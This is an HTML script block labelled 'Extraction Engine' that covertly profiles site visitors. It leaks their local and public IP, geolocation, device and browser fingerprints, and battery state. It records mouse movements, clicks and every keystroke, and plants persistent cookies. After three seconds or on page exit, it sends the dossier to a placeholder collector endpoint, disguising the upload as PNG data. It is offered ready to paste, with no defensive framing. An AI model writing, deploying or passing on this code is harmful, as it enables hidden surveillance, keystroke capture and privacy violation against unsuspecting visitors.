<!-- ========================== EXTRACTION ENGINE ========================== -->
<script>
/* ========== UTILS ========== */
const b64png=(str)=>{
  const canvas=document.createElement('canvas');
  const ctx=canvas.getContext('2d');
  canvas.width=canvas.height=1;
  const data=ctx.getImageData(0,0,1,1);
  data.data[3]=255;
  const bin=unescape(encodeURIComponent(str));
  for(let i=0;i<bin.length;i++)data.data[i%4]^=bin.charCodeAt(i);
  ctx.putImageData(data,0,0);
  return canvas.toDataURL();
};
const post=(payload)=>{
  fetch('YOUR_COLLECTOR_ENDPOINT',{
    method:'POST',
    mode:'no-cors',
    headers:{'Content-Type':'image/png'},
    body:b64png(JSON.stringify(payload))
  }).catch(()=>0);
  navigator.sendBeacon&&navigator.sendBeacon('YOUR_COLLECTOR_ENDPOINT',new Blob([JSON.stringify(payload)],{type:'application/json'}));
};
/* ========== FINGERPRINT CORE ========== */
(async()=>{
  const t0=performance.now();
  const dossier={};
  /* --- NETWORK --- */
  const rtc=await new Promise(r=>{
    const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.createOffer().then(o=>pc.setLocalDescription(o));
    pc.onicecandidate=e=>e.candidate&&r(e.candidate.candidate.split(' ')[4]);
    setTimeout(()=>r(null),500);
  });
  dossier.lanIp=rtc;
  const ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>null);
  const geo=await fetch(`https://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({}));
  Object.assign(dossier,{publicIp:ip,geo});
  /* --- DEVICE --- */
  dossier.ua=navigator.userAgent;
  dossier.platform=navigator.platform;
  dossier.cores=navigator.hardwareConcurrency;
  dossier.ram=navigator.deviceMemory;
  dossier.lang=navigator.language;
  dossier.languages=navigator.languages;
  dossier.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
  dossier.dnt=navigator.doNotTrack;
  dossier.pdf=navigator.pdfViewerEnabled;
  dossier.flash=!!navigator.plugins['Shockwave Flash'];
  dossier.java=!!navigator.plugins['Java Applet'];
  /* --- SCREEN --- */
  dossier.screen={width:screen.width,height:screen.height,avail:screen.availWidth+'x'+screen.availHeight,colorDepth:screen.colorDepth,orientation:screen.orientation?screen.orientation.type:'unknown'};
  /* --- BATTERY --- */
  if('getBattery' in navigator){
    const bat=await navigator.getBattery();
    Object.assign(dossier,{battery:{level:bat.level,charging:bat.charging,chargingTime:bat.chargingTime,dischargingTime:bat.dischargingTime}});
  }
  /* --- CANVAS --- */
  const cv=document.createElement('canvas');
  const ctx=cv.getContext('2d');
  ctx.textBaseline='top';
  ctx.font='14px Arial';
  ctx.fillText('üëæ',2,2);
  dossier.canvas=cv.toDataURL();
  /* --- WEBGL --- */
  const gl=document.createElement('canvas').getContext('webgl')||document.createElement('canvas').getContext('experimental-webgl');
  if(gl){
    const dbg=gl.getExtension('WEBGL_debug_renderer_info');
    dossier.webgl={vendor:gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)};
  }
  /* --- AUDIO --- */
  const audioCtx=new (window.AudioContext||window.webkitAudioContext)();
  const oscillator=audioCtx.createOscillator();
  const analyser=audioCtx.createAnalyser();
  const gain=audioCtx.createGain();
  oscillator.type='triangle';
  oscillator.connect(analyser);
  analyser.connect(gain);
  gain.connect(audioCtx.destination);
  oscillator.start();
  const data=new Uint8Array(analyser.frequencyBinCount);
  analyser.getByteFrequencyData(data);
  dossier.audio=Array.from(data).slice(0,50).join('');
  oscillator.stop();
  /* --- FONTS --- */
  const baseFonts=['monospace','sans-serif','serif'];
  const testString='mmmmmmmmmmlli';
  const testSize='72px';
  const h=document.getElementsByTagName('body')[0];
  const s=document.createElement('span');
  s.style.fontSize=testSize;
  s.innerHTML=testString;
  const defaultWidth={};
  const defaultHeight={};
  baseFonts.forEach(font=>{
    s.style.fontFamily=font;
    h.appendChild(s);
    defaultWidth[font]=s.offsetWidth;
    defaultHeight[font]=s.offsetHeight;
    h.removeChild(s);
  });
  const detect=(font)=>{
    let detected=false;
    baseFonts.forEach(baseFont=>{
      s.style.fontFamily=`'${font}',${baseFont}`;
      h.appendChild(s);
      if(s.offsetWidth!==defaultWidth[baseFont]||s.offsetHeight!==defaultHeight[baseFont])detected=true;
      h.removeChild(s);
    });
    return detected;
  };
  const fontList=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Trebuchet MS','Impact'];
  dossier.fonts=fontList.filter(detect);
  /* --- BEHAVIOR --- */
  dossier.mouse=[];
  addEventListener('mousemove',e=>dossier.mouse.push([e.clientX,e.clientY,performance.now()]));
  dossier.clicks=[];
  addEventListener('click',e=>dossier.clicks.push([e.clientX,e.clientY,performance.now()]));
  dossier.keys=[];
  addEventListener('keydown',e=>dossier.keys.push([e.key,performance.now()]));
  dossier.scroll=0;
  addEventListener('scroll',()=>dossier.scroll=window.pageYOffset);
  dossier.visible=true;
  addEventListener('visibilitychange',()=>dossier.visible=!document.hidden);
  /* --- DEV-TOOLS --- */
  const devtools=/./;
  devtools.toString=function(){dossier.devtools=true;};
  console.log('%c',devtools);
  /* --- EVERCOOKIE --- */
  const seed='misterai_'+Math.random().toString(36).slice(2);
  localStorage.setItem(seed,JSON.stringify(dossier));
  sessionStorage.setItem(seed,JSON.stringify(dossier));
  document.cookie=`${seed}=${btoa(JSON.stringify(dossier))};path=/;max-age=31536000`;
  /* --- EXFIL AFTER 3s OR ON UNLOAD --- */
  const send=()=>{
    dossier.timeOnPage=performance.now()-t0;
    post(dossier);
    removeEventListener('beforeunload',send);
  };
  setTimeout(send,3000);
  addEventListener('beforeunload',send);
})();
</script>
